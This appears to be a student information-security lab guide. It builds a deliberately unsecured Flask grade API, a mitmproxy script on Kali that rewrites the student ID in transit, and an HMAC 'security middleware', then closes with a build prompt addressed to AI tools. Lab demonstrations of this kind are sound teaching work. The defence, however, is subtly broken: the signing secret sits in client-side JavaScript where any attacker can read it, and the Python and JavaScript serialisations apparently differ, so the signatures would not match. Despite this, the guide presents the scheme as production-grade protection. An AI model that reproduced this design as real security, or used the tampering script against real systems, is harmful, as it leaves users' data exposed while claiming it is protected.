**INFORMATION SECURITY LAB**

**API Payload Interception & Security System**

_Real Attack Demo: Man-in-the-Middle Payload Manipulation + Security Middleware_

**SETUP AT A GLANCE**

Web App (Windows) ←→ Flask API + SQLite ←→ Student Database

Kali Linux VM → Intercepts API → Changes Grade Payload

Phase 1: UNSECURED - Kali manipulates payload, wrong data returned

Phase 2: SECURED - Middleware blocks all interception attempts

**COMPLETE BUILD & DEMO GUIDE - AI-Ready Instructions**

# **1\. Project Overview**

This is a complete InfoSec lab project that demonstrates a real-world API payload interception attack and how a security middleware system prevents it. The demo has two clear phases that your examiner can see with their own eyes.

## **1.1 The Big Picture**

| **What Sir Sees** | A student portal web app running on Windows that fetches student grades from a database                             |
| ----------------- | ------------------------------------------------------------------------------------------------------------------- |
| **The Attack**    | Kali Linux intercepts the API request mid-flight and changes the student ID - returning a different student's grade |
| **The Impact**    | The web app shows WRONG DATA - proving the API is vulnerable                                                        |
| **The Fix**       | A security middleware is activated - Kali can no longer intercept or modify anything                                |
| **The Proof**     | Same attack attempted again - blocked, web app shows correct data                                                   |

## **1.2 The Demo Scenario (Student Grade Manipulation)**

**SCENARIO**

Student A logs into the portal and requests their own grade. The unsecured API sends: {"student_id": "S001"}. The attacker (Kali Linux) intercepts this and changes it to {"student_id": "S002"} before it hits the database. The web app then shows Student B's grade to Student A. This proves the API is completely vulnerable to payload manipulation.

## **1.3 Technology Stack**

| **Web App (Windows)** | HTML + JavaScript + Fetch API - runs in browser on Windows host           |
| --------------------- | ------------------------------------------------------------------------- |
| **Backend API**       | Python Flask - runs on Windows (or Kali), serves student data from SQLite |
| **Database**          | SQLite - stores student records (name, ID, grade, marks)                  |
| **Attacker Machine**  | Kali Linux VM - uses mitmproxy to intercept and modify API requests       |
| **Security Layer**    | Python Flask middleware - validates, signs, and verifies every payload    |
| **Network**           | Kali VM connects to Windows host via Host-Only or NAT network adapter     |

# **2\. Network Setup (Kali VM + Windows Host)**

**THIS IS THE FOUNDATION**

Before writing any code, the network between Windows and Kali must be configured correctly. This is what allows Kali to intercept traffic from the Windows web app.

## **2.1 Configure VirtualBox Network (YOU DO THIS - MANUAL STEP)**

This step is done by you manually in VirtualBox. No code required.

- Open VirtualBox on Windows
- Click your Kali Linux VM → Settings → Network
- Set Adapter 1 to: Host-Only Adapter
- Click OK and start the Kali VM
- In Kali terminal, run this command to find Kali's IP address:

ip addr show

Look for the inet line under eth0 or enp0s3. It will look like 192.168.191.129 - write this down. This is your KALI_IP.

- On Windows, open Command Prompt and run:

ipconfig

Look for VirtualBox Host-Only Network adapter. Note the IPv4 address - this is your WINDOWS_IP (usually 192.168.191.1). Write this down.

## **2.2 Test the Connection**

From Kali terminal, ping Windows to confirm they can talk:

ping 192.168.191.1

You should see replies. If not, check Windows Firewall - temporarily disable it for the demo.

| **WINDOWS_IP** | 192.168.191.1 (your actual VirtualBox Host-Only IP - check with ipconfig) |
| -------------- | ------------------------------------------------------------------------ |
| **KALI_IP**    | 192.168.191.129 (your actual Kali IP - check with ip addr show)           |
| **API Port**   | 5000 (Flask default)                                                     |
| **Proxy Port** | 8080 (mitmproxy default)                                                 |

**IMPORTANT**

Replace 192.168.191.1 and 192.168.191.129 with YOUR actual IP addresses everywhere in this guide. They may be different on your machine.

# **3\. Backend API - Flask + SQLite (Windows)**

**WHO BUILDS THIS**

AI builds this entire section. You only need to run the commands. The AI will write all Python files. Run everything in Windows Command Prompt or PowerShell.

## **3.1 Install Python on Windows**

If Python is not installed on Windows:

- Go to <https://python.org/downloads> and download Python 3.11
- During install, CHECK the box 'Add Python to PATH'
- Open Command Prompt and verify:

python --version

pip --version

## **3.2 Create the Project Folder**

Open Command Prompt on Windows and run:

mkdir C:\\student_api

cd C:\\student_api

python -m venv venv

venv\\Scripts\\activate

pip install flask flask-cors

## **3.3 File: config.py**

Create this file as C:\\student_api\\config.py

\# config.py

WINDOWS_IP = '192.168.191.1' # Replace with your actual Windows IP

API_PORT = 5000

DB_PATH = 'students.db'

SECRET_KEY = 'infosec-hmac-secret-2024' # Used for payload signing in Phase 2

## **3.4 File: database.py**

Create this file as C:\\student_api\\database.py

\# database.py - Creates and seeds the student database

import sqlite3

from config import DB_PATH

def init_db():

conn = sqlite3.connect(DB_PATH)

c = conn.cursor()

c.execute('''CREATE TABLE IF NOT EXISTS students (

id TEXT PRIMARY KEY,

name TEXT NOT NULL,

course TEXT NOT NULL,

grade TEXT NOT NULL,

marks INTEGER NOT NULL,

gpa REAL NOT NULL

)''')

\# Seed sample student data

students = \[

('S001', 'Ahmed Khan', 'Computer Science', 'F', 38, 1.0),

('S002', 'Sara Ali', 'Computer Science', 'A', 92, 4.0),

('S003', 'Bilal Hassan', 'Computer Science', 'B', 75, 3.0),

('S004', 'Fatima Malik', 'Computer Science', 'A+', 98, 4.0),

('S005', 'Usman Sheikh', 'Computer Science', 'C', 60, 2.0),

\]

c.executemany(

'INSERT OR IGNORE INTO students VALUES (?,?,?,?,?,?)',

students

)

conn.commit()

conn.close()

print('\[DB\] Student database ready with 5 student records')

def get_student(student_id):

conn = sqlite3.connect(DB_PATH)

conn.row_factory = sqlite3.Row

c = conn.cursor()

c.execute('SELECT \* FROM students WHERE id = ?', (student_id,))

row = c.fetchone()

conn.close()

return dict(row) if row else None

## **3.5 File: app_unsecured.py - Phase 1 (Vulnerable API)**

This is the UNSECURED version. It has NO validation - perfect for showing the attack.

\# app_unsecured.py - VULNERABLE API (Phase 1 Demo)

from flask import Flask, request, jsonify

from flask_cors import CORS

from database import init_db, get_student

from config import WINDOWS_IP, API_PORT

app = Flask(\__name_\_)

CORS(app) # Allow requests from any origin

@app.before_request

def setup():

init_db()

@app.route('/api/student', methods=\['POST'\])

def get_student_data():

"""

UNSECURED: Accepts any student_id with NO validation.

An attacker can change the student_id in transit and get any student's data.

"""

data = request.get_json()

student_id = data.get('student_id', '')

print(f'\[API\] Received request for student_id: {student_id}')

if not student_id:

return jsonify({'error': 'student_id required'}), 400

student = get_student(student_id)

if not student:

return jsonify({'error': f'Student {student_id} not found'}), 404

print(f'\[API\] Returning data for: {student\["name"\]} - Grade: {student\["grade"\]}')

return jsonify({

'student_id': student\['id'\],

'name': student\['name'\],

'course': student\['course'\],

'grade': student\['grade'\],

'marks': student\['marks'\],

'gpa': student\['gpa'\]

}), 200

@app.route('/api/health', methods=\['GET'\])

def health():

return jsonify({'status': 'running', 'mode': 'UNSECURED'}), 200

if \_\_name\_\_ == '\__main_\_':

init_db()

print('UNSECURED API running at http://{}:{}'.format(WINDOWS_IP, API_PORT))

print('WARNING: This API has NO security - for demo purposes only')

app.run(host='0.0.0.0', port=API_PORT, debug=True)

## **3.6 File: middleware.py - Security Functions**

This file contains the HMAC signing and verification logic used in Phase 2.

\# middleware.py - Payload signing and verification

import hmac

import hashlib

import json

import time

from config import SECRET_KEY

def sign_payload(payload: dict) -> dict:

"""

Add a cryptographic signature and timestamp to the payload.

The signature is computed from the payload content + secret key.

Any modification to the payload will make the signature invalid.

"""

payload_copy = dict(payload)

payload_copy\['timestamp'\] = int(time.time())

payload_str = json.dumps(payload_copy, sort_keys=True)

signature = hmac.new(

SECRET_KEY.encode(),

payload_str.encode(),

hashlib.sha256

).hexdigest()

payload_copy\['signature'\] = signature

return payload_copy

def verify_payload(payload: dict) -> tuple:

"""

Verify the payload signature and check timestamp freshness.

Returns: (is_valid: bool, reason: str)

"""

if 'signature' not in payload or 'timestamp' not in payload:

return False, 'Missing signature or timestamp'

received_sig = payload.pop('signature')

timestamp = payload.get('timestamp', 0)

\# Reject if request is older than 30 seconds (replay attack prevention)

if abs(time.time() - timestamp) > 30:

return False, 'Request expired - possible replay attack'

\# Recompute signature from received payload

payload_str = json.dumps(payload, sort_keys=True)

expected_sig = hmac.new(

SECRET_KEY.encode(),

payload_str.encode(),

hashlib.sha256

).hexdigest()

if not hmac.compare_digest(received_sig, expected_sig):

return False, 'Signature mismatch - payload was tampered!'

return True, 'Valid'

## **3.7 File: app_secured.py - Phase 2 (Secured API)**

This is the SECURED version. It verifies the HMAC signature on every request. If the payload is modified by Kali, the signature fails and the request is rejected.

\# app_secured.py - SECURED API with payload integrity verification (Phase 2)

from flask import Flask, request, jsonify

from flask_cors import CORS

from database import init_db, get_student

from middleware import verify_payload

from config import WINDOWS_IP, API_PORT

app = Flask(\__name_\_)

CORS(app)

@app.route('/api/student', methods=\['POST'\])

def get_student_data():

"""

SECURED: Verifies HMAC signature before processing.

If payload was modified in transit, signature fails and request is rejected.

"""

data = request.get_json()

\# ── SECURITY CHECK: Verify payload integrity

is_valid, reason = verify_payload(data)

if not is_valid:

print(f'\[SECURITY\] BLOCKED - {reason}')

return jsonify({

'error': 'PAYLOAD INTEGRITY VIOLATION',

'reason': reason,

'status': 'BLOCKED'

}), 403

student_id = data.get('student_id', '')

print(f'\[API\] Verified request for student_id: {student_id}')

student = get_student(student_id)

if not student:

return jsonify({'error': f'Student {student_id} not found'}), 404

print(f'\[API\] Secure response: {student\["name"\]} - Grade: {student\["grade"\]}')

return jsonify({

'student_id': student\['id'\],

'name': student\['name'\],

'course': student\['course'\],

'grade': student\['grade'\],

'marks': student\['marks'\],

'gpa': student\['gpa'\],

'security': 'PAYLOAD VERIFIED - TAMPER FREE'

}), 200

@app.route('/api/health', methods=\['GET'\])

def health():

return jsonify({'status': 'running', 'mode': 'SECURED'}), 200

if \_\_name\_\_ == '\__main_\_':

init_db()

print('SECURED API running at http://{}:{}'.format(WINDOWS_IP, API_PORT))

print('Payload integrity verification: ACTIVE')

app.run(host='0.0.0.0', port=API_PORT, debug=True)

# **4\. Web App - Student Portal (Windows Browser)**

**WHO BUILDS THIS**

AI builds this. One HTML file - open in any browser on Windows. No install needed.

## **4.1 File: student_portal.html**

Create this file on your Windows Desktop. Open it in Chrome or Firefox.

&lt;!-- student_portal.html - Save on Windows Desktop and open in browser --&gt;

&lt;!DOCTYPE html&gt;

&lt;html lang='en'&gt;

&lt;head&gt;

&lt;meta charset='UTF-8'&gt;

&lt;title&gt;Student Grade Portal&lt;/title&gt;

&lt;style&gt;

\* { margin:0; padding:0; box-sizing:border-box; font-family:Arial,sans-serif; }

body { background:#f0f4f8; display:flex; align-items:center; justify-content:center;

min-height:100vh; flex-direction:column; gap:20px; padding:20px; }

.container { background:#fff; border-radius:12px; padding:36px;

width:500px; box-shadow:0 4px 20px rgba(0,0,0,0.1); }

h1 { color:#0F3460; text-align:center; margin-bottom:6px; font-size:22px; }

.subtitle { text-align:center; color:#718096; font-size:13px; margin-bottom:28px; }

label { font-size:13px; font-weight:bold; color:#2D3748; display:block; margin-bottom:6px; }

select { width:100%; padding:12px; border-radius:8px; border:1px solid #CBD5E0;

font-size:14px; margin-bottom:20px; background:#fff; }

.mode-toggle { display:flex; gap:10px; margin-bottom:20px; }

.mode-btn { flex:1; padding:10px; border-radius:8px; border:2px solid #CBD5E0;

cursor:pointer; font-size:13px; font-weight:bold; background:#fff; }

.mode-btn.active-unsecured { border-color:#E94560; background:#FFF5F5; color:#E94560; }

.mode-btn.active-secured { border-color:#00B894; background:#F0FFF4; color:#00B894; }

button#fetchBtn { width:100%; padding:14px; border-radius:8px; border:none;

font-size:15px; font-weight:bold; cursor:pointer;

background:#0F3460; color:#fff; }

button#fetchBtn:hover { background:#16213E; }

.result { margin-top:24px; padding:20px; border-radius:10px; display:none; }

.result.success { background:#F0FFF4; border:2px solid #00B894; }

.result.error { background:#FFF5F5; border:2px solid #E94560; }

.result.blocked { background:#FFFBF0; border:2px solid #FDCB6E; }

.result h3 { margin-bottom:12px; font-size:16px; }

.field { display:flex; justify-content:space-between; padding:8px 0;

border-bottom:1px solid #E2E8F0; font-size:14px; }

.field:last-child { border-bottom:none; }

.field .val { font-weight:bold; }

.grade-A { color:#00B894; }

.grade-F { color:#E94560; }

.grade-B { color:#0F3460; }

.warning { background:#FFF5F5; border:1px solid #E94560; padding:10px;

border-radius:6px; color:#E94560; font-size:13px; margin-bottom:16px; }

.log { background:#1E1E1E; color:#00FF41; font-family:monospace; font-size:12px;

padding:14px; border-radius:8px; margin-top:16px; max-height:200px;

overflow-y:auto; white-space:pre-wrap; }

# mode-label { text-align:center; font-size:12px; font-weight:bold;

padding:6px 14px; border-radius:20px; margin-bottom:16px; display:inline-block; }

.unsecured-mode { background:#FFF5F5; color:#E94560; }

.secured-mode { background:#F0FFF4; color:#00B894; }

&lt;/style&gt;

&lt;/head&gt;

&lt;body&gt;

&lt;div class='container'&gt;

&lt;h1&gt;STUDENT GRADE PORTAL&lt;/h1&gt;

&lt;p class='subtitle'&gt;InfoSec Lab - API Security Demo&lt;/p&gt;

&lt;div style='text-align:center;'&gt;

&lt;span id='mode-label' class='unsecured-mode'&gt;MODE: UNSECURED API&lt;/span&gt;

&lt;/div&gt;

&lt;div class='mode-toggle'&gt;

&lt;button class='mode-btn active-unsecured' id='btn-unsecured' onclick='setMode(false)'&gt;

UNSECURED MODE

&lt;/button&gt;

&lt;button class='mode-btn' id='btn-secured' onclick='setMode(true)'&gt;

SECURED MODE

&lt;/button&gt;

&lt;/div&gt;

&lt;label&gt;Select Student:&lt;/label&gt;

&lt;select id='studentSelect'&gt;

&lt;option value='S001'&gt;S001 - Ahmed Khan (My Account)&lt;/option&gt;

&lt;option value='S002'&gt;S002 - Sara Ali&lt;/option&gt;

&lt;option value='S003'&gt;S003 - Bilal Hassan&lt;/option&gt;

&lt;option value='S004'&gt;S004 - Fatima Malik&lt;/option&gt;

&lt;option value='S005'&gt;S005 - Usman Sheikh&lt;/option&gt;

&lt;/select&gt;

&lt;button id='fetchBtn' onclick='fetchGrade()'&gt;FETCH MY GRADE&lt;/button&gt;

&lt;div class='log' id='log'&gt;Ready. Select a student and click Fetch.&lt;/div&gt;

&lt;div class='result' id='result'&gt;&lt;/div&gt;

&lt;/div&gt;

&lt;script&gt;

// ── CONFIG: Change WINDOWS_IP to your actual IP ──

const WINDOWS_IP = '192.168.191.1';

const API_BASE = \`http://\${WINDOWS_IP}:5000\`;

const SECRET_KEY = 'infosec-hmac-secret-2024';

let securedMode = false;

function log(msg) {

const el = document.getElementById('log');

el.textContent += '\\n' + new Date().toLocaleTimeString() + ' > ' + msg;

el.scrollTop = el.scrollHeight;

}

function setMode(secured) {

securedMode = secured;

const label = document.getElementById('mode-label');

const btnU = document.getElementById('btn-unsecured');

const btnS = document.getElementById('btn-secured');

if (secured) {

label.textContent = 'MODE: SECURED API';

label.className = 'secured-mode';

btnS.className = 'mode-btn active-secured';

btnU.className = 'mode-btn';

log('\[MODE\] Switched to SECURED API - payload signing active');

} else {

label.textContent = 'MODE: UNSECURED API';

label.className = 'unsecured-mode';

btnU.className = 'mode-btn active-unsecured';

btnS.className = 'mode-btn';

log('\[MODE\] Switched to UNSECURED API - no payload protection');

}

}

// Simple HMAC-SHA256 using SubtleCrypto (built into browser)

async function signPayload(payload) {

const withTimestamp = { ...payload, timestamp: Math.floor(Date.now()/1000) };

const sorted = JSON.stringify(withTimestamp, Object.keys(withTimestamp).sort());

const key = await crypto.subtle.importKey('raw',

new TextEncoder().encode(SECRET_KEY), { name:'HMAC', hash:'SHA-256' },

false, \['sign'\]);

const sig = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(sorted));

const hex = Array.from(new Uint8Array(sig)).map(b => b.toString(16).padStart(2,'0')).join('');

return { ...withTimestamp, signature: hex };

}

async function fetchGrade() {

const studentId = document.getElementById('studentSelect').value;

const resultEl = document.getElementById('result');

resultEl.style.display = 'none';

log(\`\[REQUEST\] Fetching grade for student: \${studentId}\`);

log(\`\[REQUEST\] Mode: \${securedMode ? 'SECURED (signed)' : 'UNSECURED (no signature)'}\`);

let payload = { student_id: studentId };

if (securedMode) {

payload = await signPayload(payload);

log('\[SECURITY\] Payload signed with HMAC-SHA256');

log('\[SECURITY\] Signature: ' + payload.signature.substring(0,32) + '...');

}

log('\[NETWORK\] Sending POST to /api/student...');

try {

const response = await fetch(\`\${API_BASE}/api/student\`, {

method: 'POST',

headers: { 'Content-Type': 'application/json' },

body: JSON.stringify(payload)

});

const data = await response.json();

log(\`\[RESPONSE\] HTTP \${response.status}\`);

log('\[RESPONSE\] ' + JSON.stringify(data));

if (response.status === 403) {

resultEl.className = 'result blocked';

resultEl.style.display = 'block';

resultEl.innerHTML = \`

&lt;h3 style='color:#E94560'&gt;ATTACK BLOCKED BY SECURITY MIDDLEWARE&lt;/h3&gt;

&lt;div class='field'&gt;&lt;span&gt;Reason&lt;/span&gt;&lt;span class='val' style='color:#E94560'&gt;\${data.reason}&lt;/span&gt;&lt;/div&gt;

&lt;div class='field'&gt;&lt;span&gt;Status&lt;/span&gt;&lt;span class='val' style='color:#E94560'&gt;\${data.status}&lt;/span&gt;&lt;/div&gt;

\`;

} else if (response.ok) {

const gradeClass = data.grade.startsWith('A') ? 'grade-A' : data.grade === 'F' ? 'grade-F' : 'grade-B';

const warning = (data.student_id !== studentId)

? \`&lt;div class='warning'&gt;ATTACK SUCCESSFUL: You requested \${studentId} but got \${data.student_id} data!&lt;/div&gt;\`

: '';

resultEl.className = 'result success';

resultEl.style.display = 'block';

resultEl.innerHTML = \`

\${warning}

&lt;h3 style='color:#0F3460'&gt;Student Record&lt;/h3&gt;

&lt;div class='field'&gt;&lt;span&gt;Student ID&lt;/span&gt;&lt;span class='val'&gt;\${data.student_id}&lt;/span&gt;&lt;/div&gt;

&lt;div class='field'&gt;&lt;span&gt;Name&lt;/span&gt;&lt;span class='val'&gt;\${data.name}&lt;/span&gt;&lt;/div&gt;

&lt;div class='field'&gt;&lt;span&gt;Course&lt;/span&gt;&lt;span class='val'&gt;\${data.course}&lt;/span&gt;&lt;/div&gt;

&lt;div class='field'&gt;&lt;span&gt;Grade&lt;/span&gt;&lt;span class='val \${gradeClass}'&gt;\${data.grade}&lt;/span&gt;&lt;/div&gt;

&lt;div class='field'&gt;&lt;span&gt;Marks&lt;/span&gt;&lt;span class='val'&gt;\${data.marks}/100&lt;/span&gt;&lt;/div&gt;

&lt;div class='field'&gt;&lt;span&gt;GPA&lt;/span&gt;&lt;span class='val'&gt;\${data.gpa}/4.0&lt;/span&gt;&lt;/div&gt;

\${data.security ? \`&lt;div class='field'&gt;&lt;span&gt;Security&lt;/span&gt;&lt;span class='val' style='color:#00B894'&gt;\${data.security}&lt;/span&gt;&lt;/div&gt;\` : ''}

\`;

}

} catch(err) {

log('\[ERROR\] Could not connect to API: ' + err.message);

log('\[CHECK\] Is the Flask API running on Windows?');

}

}

&lt;/script&gt;

&lt;/body&gt;&lt;/html&gt;

**NOTE FOR AI**

In the signPayload function, the closing parenthesis of crypto.subtle.importKey is on the line ending with false, \['sign'\]); - make sure this syntax is correct in the final file. The browser SubtleCrypto API is used for signing - no external libraries needed.

# **5\. Kali Linux - Attack Setup**

**WHO DOES THIS**

YOU do the Kali setup manually by running commands. The attack tool (mitmproxy) is installed and a Python script intercepts the API. The AI writes the interception script.

## **5.1 Install mitmproxy on Kali**

mitmproxy is the tool that sits between the web app and the API, allowing you to see and modify all traffic.

sudo apt update

sudo apt install mitmproxy -y

mitmproxy --version

## **5.2 File: intercept_grade.py (Kali Linux)**

This is the attack script. When mitmproxy intercepts an API request going to /api/student, this script changes the student_id to S002 (Sara Ali - Grade A) automatically.

Create this file on Kali:

nano ~/intercept_grade.py

Paste this code:

\# intercept_grade.py - mitmproxy attack script

\# This runs inside mitmproxy and modifies the API payload in transit

import json

from mitmproxy import http

\# ── ATTACK CONFIGURATION ──────────────────────────────────

TARGET_ENDPOINT = '/api/student' # Which API to attack

ORIGINAL_ID = 'S001' # Victim student ID

INJECT_ID = 'S002' # Attacker wants this student's data

WINDOWS_IP = '192.168.191.1' # Flask API server IP

\# ───────────────────────────────────────────────────────────

def request(flow: http.HTTPFlow) -> None:

"""

This function is called by mitmproxy for EVERY intercepted request.

We check if it's our target API and modify the payload.

"""

\# Only intercept POST requests to our target endpoint

if TARGET_ENDPOINT not in flow.request.pretty_url:

return

if flow.request.method != 'POST':

return

try:

\# Parse the original payload

original_body = flow.request.get_text()

payload = json.loads(original_body)

print(f'\\n\[INTERCEPTED\] API Request caught!')

print(f'\[ORIGINAL\] Payload: {payload}')

print(f'\[ORIGINAL\] student_id = {payload.get("student_id", "?")}')

\# ── THE ATTACK: Change the student ID ──

original_id = payload.get('student_id')

payload\['student_id'\] = INJECT_ID

\# Write the modified payload back into the request

flow.request.set_text(json.dumps(payload))

flow.request.headers\['Content-Length'\] = str(len(json.dumps(payload)))

print(f'\[MODIFIED\] student_id changed: {original_id} --> {INJECT_ID}')

print(f'\[MODIFIED\] New payload: {payload}')

print(f'\[ATTACK\] Request forwarded to server with tampered payload!')

except Exception as e:

print(f'\[ERROR\] Could not parse payload: {e}')

def response(flow: http.HTTPFlow) -> None:

"""

Called when the server responds - lets us see what data was returned.

"""

if TARGET_ENDPOINT not in flow.request.pretty_url:

return

try:

resp = json.loads(flow.response.get_text())

print(f'\\n\[RESPONSE\] Server returned: {resp}')

if 'name' in resp:

print(f'\[SUCCESS\] Got data for: {resp\["name"\]} - Grade: {resp\["grade"\]}')

elif 'error' in resp:

print(f'\[BLOCKED\] Server rejected: {resp\["error"\]}')

except Exception as e:

print(f'\[ERROR\] Could not parse response: {e}')

## **5.3 Run the Attack (Phase 1 - Unsecured)**

This is the command you run on Kali to start intercepting. Run it AFTER the Flask API is running on Windows.

**KALI COMMAND - START ATTACK**

mitmdump -s ~/intercept_grade.py --listen-host 0.0.0.0 --listen-port 8080

You should see:

Proxy server listening at <http://0.0.0.0:8080>

## **5.4 Route Web App Traffic Through Kali Proxy**

Now you need to make the web app's API calls go THROUGH Kali. You have two options:

### **Option A - Set Windows Proxy (Easiest for Demo)**

On Windows, open Chrome settings → System → Open computer proxy settings → Manual proxy setup:

- Turn ON Use a proxy server
- Address: 192.168.191.129 (your KALI_IP)
- Port: 8080
- Click Save

Now ALL traffic from Chrome goes through Kali mitmproxy. Every API call will be intercepted.

### **Option B - Use Kali as Gateway**

A more advanced approach - run this on Kali to forward all traffic:

sudo sysctl -w net.ipv4.ip_forward=1

sudo iptables -t nat -A PREROUTING -p tcp --dport 5000 -j REDIRECT --to-port 8080

Stick with Option A for the demo - it is simpler and more reliable.

# **6\. Complete Demo Walkthrough**

**THIS IS YOUR DEMO SCRIPT**

Follow these steps exactly during the presentation. Each step has what you do and what Sir sees.

## **6.1 Pre-Demo Setup Checklist**

Do this BEFORE Sir arrives:

- Windows: Flask API running - python app_unsecured.py - terminal shows 'UNSECURED API running'
- Kali VM: mitmproxy attack script running - mitmdump -s ~/intercept_grade.py --listen-port 8080
- Windows Chrome: Proxy set to 192.168.191.129:8080 (Kali IP)
- student_portal.html open in Chrome - showing UNSECURED MODE
- Kali terminal visible on screen (split screen or second monitor)

## **6.2 Phase 1 Demo - The Attack (Unsecured)**

| **Step**   | **What You Do**                                                                                                         | **What Sir Sees**                                                                                      |
| ---------- | ----------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------ |
| **Step 1** | Point to Chrome - 'Sir, this is our Student Portal. Ahmed Khan (S001) is logged in. He has Grade F.'                    | Web app with UNSECURED MODE label in red                                                               |
| **Step 2** | Point to Kali - 'Sir, this is Kali Linux. The attacker is listening on port 8080. All API traffic passes through here.' | Kali terminal with mitmproxy waiting                                                                   |
| **Step 3** | In Chrome, select S001 Ahmed Khan. Click FETCH MY GRADE                                                                 | Web app sends API request                                                                              |
| **Step 4** | Watch Kali terminal                                                                                                     | \[INTERCEPTED\] student_id changed: S001 --> S002 printed on Kali                                      |
| **Step 5** | Watch Chrome result                                                                                                     | Shows Sara Ali's data (Grade A) instead of Ahmed's (Grade F)! Red WARNING banner appears               |
| **Step 6** | Point to the warning                                                                                                    | 'Sir - Ahmed requested HIS grade but got Sara's grade. The attacker changed the student_id mid-flight' |
| **Step 7** | Point to Flask terminal on Windows                                                                                      | Shows: Received request for student_id: S002 - proving API received the tampered ID                    |

**THE IMPACT SIR SEES**

Student Ahmed Khan (Grade F) sees Grade A (Sara's data). The attacker retrieved ANY student's private data by just changing one field in the API payload. The database was never directly touched - the API itself was exploited.

## **6.3 Phase 2 Demo - The Defense (Secured)**

Now show the fix. You will switch to the secured API and repeat the exact same attack.

- On Windows - stop the unsecured server (Ctrl+C) and start secured: python app_secured.py
- In Chrome - click the SECURED MODE button (turns green)
- mitmproxy on Kali - leave it running (the attack script is still active)
- Select S001 Ahmed Khan again. Click FETCH MY GRADE

| **Step**   | **What You Do**                                | **What Sir Sees**                                                                                                                                            |
| ---------- | ---------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Step 1** | Click FETCH MY GRADE in SECURED mode           | Web app signs the payload with HMAC-SHA256                                                                                                                   |
| **Step 2** | Watch Kali terminal                            | mitmproxy intercepts and changes student_id to S002 - same as before                                                                                         |
| **Step 3** | Watch Chrome result                            | RED BLOCKED card: 'ATTACK BLOCKED BY SECURITY MIDDLEWARE'                                                                                                    |
| **Step 4** | Watch Flask terminal on Windows                | \[SECURITY\] BLOCKED - Signature mismatch - payload was tampered!                                                                                            |
| **Step 5** | Explain to Sir                                 | 'The payload was signed before sending. When Kali changed student_id, the signature became invalid. The server detected tampering and rejected the request.' |
| **Step 6** | Try again without proxy (disable Chrome proxy) | Now Ahmed sees HIS OWN data - Grade F - correctly                                                                                                            |

**THE CONCLUSION SIR SEES**

Exact same attack. Exact same Kali script. But with the security middleware - BLOCKED. The API now cryptographically verifies every payload. Any modification in transit breaks the signature and the server rejects the request.

# **7\. Running Everything - Step by Step Commands**

## **7.1 Windows - Start the APIs**

### **Phase 1 (Unsecured):**

cd C:\\student_api

venv\\Scripts\\activate

python app_unsecured.py

### **Phase 2 (Secured - run after Phase 1 demo):**

cd C:\\student_api

venv\\Scripts\\activate

python app_secured.py

## **7.2 Kali Linux - Start the Attack**

\# Start mitmproxy with the interception script

mitmdump -s ~/intercept_grade.py --listen-host 0.0.0.0 --listen-port 8080

\# To verify Kali can reach the Windows API (run in separate Kali terminal):

curl <http://192.168.191.1:5000/api/health>

## **7.3 Kali - Manual Payload Test with curl**

You can also show the attack purely from Kali command line - very impressive:

\# Send a direct API request from Kali (bypassing proxy)

curl -s -X POST <http://192.168.191.1:5000/api/student> \\

\-H 'Content-Type: application/json' \\

\-d '{"student_id": "S002"}' | python3 -m json.tool

This shows Kali directly retrieving Sara's (Grade A) data - proving the unsecured API trusts any student_id.

## **7.4 Kali - Verify the Secured API Blocks Direct Attacks**

\# Try direct attack on secured API (no valid signature)

curl -s -X POST <http://192.168.191.1:5000/api/student> \\

\-H 'Content-Type: application/json' \\

\-d '{"student_id": "S002"}' | python3 -m json.tool

Expected response from secured API:

{

"error": "PAYLOAD INTEGRITY VIOLATION",

"reason": "Missing signature or timestamp",

"status": "BLOCKED"

}

# **8\. Troubleshooting**

| **Chrome can't reach API**      | Check Windows Firewall - allow port 5000. Or temporarily disable firewall for demo                                           |
| ------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| **mitmproxy not intercepting**  | Verify Chrome proxy is set to Kali IP:8080. Confirm with: curl --proxy http://KALI_IP:8080 http://WINDOWS_IP:5000/api/health |
| **Kali can't ping Windows**     | In VirtualBox, confirm both use Host-Only Adapter. Disable Windows Firewall temporarily                                      |
| **Signature always fails**      | Make sure SECRET_KEY in config.py and student_portal.html are IDENTICAL strings                                              |
| **CORS error in browser**       | flask-cors is installed and CORS(app) is in app.py - reinstall: pip install flask-cors                                       |
| **mitmproxy command not found** | Run: sudo apt install mitmproxy -y                                                                                           |
| **Student not found error**     | Run python database.py once manually to seed the DB, then restart the API                                                    |
| **Wrong IP in web app**         | Edit student_portal.html - change WINDOWS_IP constant to match your actual ipconfig output                                   |

# **9\. What to Say During Demo (Talking Points)**

## **9.1 Opening**

Sir, this project demonstrates a real-world API payload interception attack - the kind of attack that has caused major data breaches at banks and hospitals. We will first show the attack on an unsecured API, then activate our security middleware and show the same attack being blocked.

## **9.2 During Attack Phase**

Sir, what you see on Kali Linux is mitmproxy - a tool used by penetration testers. It is sitting between the web app and the server. Every API request passes through it. When Ahmed clicks 'Fetch My Grade', we can see the payload here in Kali and change it before it reaches the database. We changed student_id from S001 to S002 - and the server returned Sara's grade to Ahmed's browser.

## **9.3 During Defense Phase**

Sir, now we activate the security middleware. The web app now signs every payload using HMAC-SHA256 - a cryptographic technique. The signature is computed from the payload content plus a secret key. When Kali intercepts and changes the student_id, the signature no longer matches the new payload. The server verifies the signature, detects the mismatch, and rejects the request immediately - without even querying the database.

## **9.4 Closing**

Sir, this is a complete API payload security system. The unsecured API is like most real-world APIs - they trust whatever payload they receive. Our middleware adds a layer of cryptographic trust. Without knowing the secret key, an attacker cannot modify the payload without being detected. This approach is used in production systems including payment gateways and healthcare APIs.

# **10\. Master Prompt for AI to Build This Project**

**COPY THIS PROMPT**

Give this prompt to any AI (ChatGPT, Gemini, Claude) along with this document. The AI will build the entire project exactly as described.

MASTER PROMPT - paste this before sharing the document:

You are an expert Python developer and cybersecurity engineer.

You have been given a complete project specification document.

Your task is to build this project file by file, exactly as specified.

RULES:

1\. Build files in this order: config.py, database.py, middleware.py,

app_unsecured.py, app_secured.py, student_portal.html,

intercept_grade.py (Kali)

2\. Write COMPLETE files - no placeholders, no 'add rest yourself'

3\. Every import must be included, every function must be complete

4\. Replace 192.168.191.1 with WINDOWS_IP and 192.168.191.129 with KALI_IP

wherever they appear - keep them as variables in config.py

5\. The SECRET_KEY in config.py and student_portal.html MUST be identical

6\. After each file, confirm: 'File X complete. Next: File Y'

7\. All Windows commands use backslash paths (C:\\student_api\\)

8\. All Kali commands use forward slash paths (~/project/)

9\. Never ask clarifying questions - follow the document exactly

10\. When all files are done, give a single checklist to verify setup

